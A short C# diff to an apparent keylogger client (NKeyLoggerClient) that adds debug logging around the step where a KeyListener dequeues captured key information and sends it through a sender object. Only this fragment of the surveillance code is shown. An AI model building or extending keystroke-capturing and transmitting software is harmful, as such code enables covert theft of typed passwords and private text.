@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Microsoft.Extensions.Logging;
 using NKeyLoggerLib;
 
 namespace NKeyLoggerClient;
@@ -38,7 +39,10 @@ internal class KeyListener : IDisposable
                         AbstractKeyInfo? sendObj;
                         keysQueue.TryDequeue(out sendObj);
                         if (sendObj != null)
+                        {
                             sender.Send(sendObj);
+                            Log<KeyListener>.Instance.logger?.LogDebug($"KeyListener sending key information: {sendObj.ToString()}");
+                        }
                     }
                 }
         };
